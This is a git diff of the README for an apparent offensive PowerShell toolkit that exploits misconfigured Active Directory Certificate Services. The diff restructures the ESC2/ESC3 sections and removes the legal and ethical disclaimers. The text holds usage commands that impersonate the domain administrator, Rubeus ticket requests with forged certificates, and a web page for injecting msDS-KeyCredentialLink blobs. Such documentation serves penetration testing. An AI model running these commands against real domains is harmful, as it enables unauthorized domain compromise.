@@ -11,8 +11,7 @@ Certi-Bhai is a comprehensive collection of PowerShell exploitation tools for at
 - [Prerequisites](#prerequisites)
 - [Usage Guide](#usage-guide)
   - [ESC1 - Overly Permissive Certificate Template](#esc1)
-  - [ESC2 - Domain Controller Authentication](#esc2)
-  - [ESC3 - Certificate Request Agent](#esc3)
+  - [ESC2/3 - Certificate Request Agent](#esc3)
   - [ESC15 - Vulnerable Web Enrollment](#esc15)
   - [CSR Generation](#csr-generation)
   - [IIS Privilege Escalation](#iis-privilege-escalation)
@@ -27,47 +26,6 @@ Active Directory Certificate Services (AD CS) is often misconfigured, creating m
 
 ---
 
-## 📁 Directory Structure
-
-```
-Certi-Bhai/
-├── ESC1/                      # Certificate Template Request Rights Abuse
-│   ├── esc1.ps1               # Main exploitation script
-│   ├── esc1.inf               # Certificate template configuration
-│   ├── ESC1.png               # Workflow diagram
-│   └── README.md              # ESC1 documentation
-│
-├── ESC2/                      # Domain Controller Authentication Abuse
-│   ├── esc2_working.ps1       # Working exploitation script
-│   ├── ESC2_working.png       # Workflow diagram
-│   └── README.md              # ESC2 documentation
-│
-├── ESC3/                      # Certificate Request Agent Abuse
-│   ├── esc3_working.ps1       # Working exploitation script
-│   ├── ESC3_working.png       # Workflow diagram
-│   ├── esc3.png               # Additional diagram
-│   └── README.md              # ESC3 documentation
-│
-├── ESC15/                     # Misconfigured Web Enrollment
-│   ├── esc15.ps1              # Exploitation script
-│   ├── web.inf                # Web enrollment configuration
-│   ├── esc15.png              # Workflow diagram
-│   └── README.MD              # ESC15 documentation
-│
-├── CSR_Generate/              # Certificate Signing Request Utilities
-│   ├── csr_short.ps1          # Quick CSR generation
-│   ├── csr_submit.ps1         # CSR submission utility
-│   ├── csr_short.png          # Workflow diagram
-│   └── csr_submit.png         # Submission diagram
-│
-├── IIS_Privilege_Escalation/  # IIS to SYSTEM Privilege Escalation
-│   ├── cert.aspx              # Certificate handling web interface
-│   └── ldap_update.aspx       # LDAP update web interface
-│
-└── README.md                  # This file
-```
-
----
 
 ## ✅ Prerequisites
 
@@ -120,45 +78,9 @@ cd ESC1
 
 ---
 
-### ESC2: Domain Controller Authentication Abuse
-
-**Vulnerability**: Domain controllers can be impersonated through certificate-based authentication.
-
-**What it does**: Generates a certificate that can be used for domain controller authentication, enabling full domain compromise.
-
-**Usage**:
-
-```powershell
-# Navigate to ESC2 directory
-cd ESC2
-
-# Run the exploitation script
-.
-\esc2_working.ps1 -templateName "DomainController" `
-                   -target_user "administrator" `
-                   -domain "INDISHELL" `
-                   -pfxPass "password123"
-```
-
-**Parameters**:
-- `-templateName`: Vulnerable DC certificate template name
-- `-target_user`: Target user to impersonate
-- `-domain`: NETBIOS domain name
-- `-pfxPass`: PFX certificate password
-
-**Output**: PFX certificate with base64 encoding for Rubeus/PKINITtools
-
-**Video Tutorial**: https://www.youtube.com/watch?v=fGjrM-JKnoM
-
-**Next Steps**:
-```powershell
-# Use with Rubeus for TGT request
-Rubeus.exe asktgt /user:administrator /password:password123 /certificate:$base64Pfx /nowrap
-```
-
 ---
 
-### ESC3: Certificate Request Agent Abuse
+### ESC2/3: Any Purpose/Certificate Request Agent Abuse
 
 **Vulnerability**: Certificate Request Agents can request certificates on behalf of any user.
 
@@ -211,7 +133,7 @@ cd ESC15
 
 ---
 
-## 🎓 CSR Generation and Management
+## CSR Generation and Management
 
 ### Quick CSR Generation
 
@@ -236,11 +158,11 @@ cd CSR_Generate
 
 ---
 
-## 🔐 IIS Privilege Escalation
+##  IIS Privilege Escalation
 
 ### Certificate Management Interface
 
-The `cert.aspx` web interface provides a user-friendly form for certificate operations:
+The `cert.aspx` web interface provides a user-friendly form to request a certificate from AD CS RPC endpoint:
 
 ```
 http://your-iis-server/cert.aspx
@@ -248,7 +170,7 @@ http://your-iis-server/cert.aspx
 
 ### LDAP Update Interface
 
-Modify LDAP attributes through the web interface:
+Modify LDAP attributes through the web interface. This script basically used to perform inject blob in `msDS-KeyCredentialLink` attribute:
 
 ```
 http://your-iis-server/ldap_update.aspx
@@ -261,7 +183,7 @@ http://your-iis-server/ldap_update.aspx
 
 ---
 
-## 📊 Quick Reference Commands
+## Quick Reference Commands
 
 ### For ESC1 Exploitation
 ```powershell
@@ -284,41 +206,9 @@ $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate
 Rubeus.exe asktgt /user:administrator /certificate:$base64cert /nowrap
 ```
 
----
-
-## 🎬 Educational Resources
-
-### Video Tutorials
-
-- **ESC1 Exploitation**: https://www.youtube.com/watch?v=l0gMw_mO4dw
-- **ESC2/3 Exploitation**: https://www.youtube.com/watch?v=fGjrM-JKnoM
-
-### Related Topics
-- Active Directory Certificate Services (AD CS)
-- X.509 Certificates
-- Public Key Infrastructure (PKI)
-- Kerberos Authentication
-- Certificate-based Authentication
 
 ---
 
-## ⚠️ Legal and Ethical Considerations
-
-This toolkit is provided for:
-- ✅ Authorized security testing
-- ✅ Educational purposes
-- ✅ Research and development
-- ✅ Defensive security training
-
-This toolkit should **NOT** be used for:
-- ❌ Unauthorized system access
-- ❌ Malicious purposes
-- ❌ Violations of laws or policies
-- ❌ Testing systems without written permission
-
-**Always obtain proper authorization before testing any systems.**
-
----
 
 ## 🔧 Troubleshooting
 
@@ -353,23 +243,6 @@ Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process
 5. Retrieve issued certificate
 6. Export as PFX with password
 
-### Exploitation Flow
-
-```
-Identify Vulnerability → Generate Certificate → Request with High Privileges → 
-Export PFX → Use with Auth Tools (Rubeus) → Obtain TGT → Full Domain Compromise
-```
-
----
-
-## 📚 Further Reading
-
-- Microsoft AD CS Security Guide
-- Certified Ethical Hacker (CEH) Materials
-- SANS SEC504 - Hacker Tools and Incident Handling
-- Active Directory Security Best Practices
-
----
 
 ## 🤝 Contributing
 
@@ -377,6 +250,3 @@ Found an issue or have improvements? Please report responsibly.
 
 ---
 
-## ⚖️ Disclaimer
-
-This toolkit is provided as-is for educational and authorized security testing purposes. Users are responsible for all actions taken with this toolkit. Unauthorized access to computer systems is illegal.
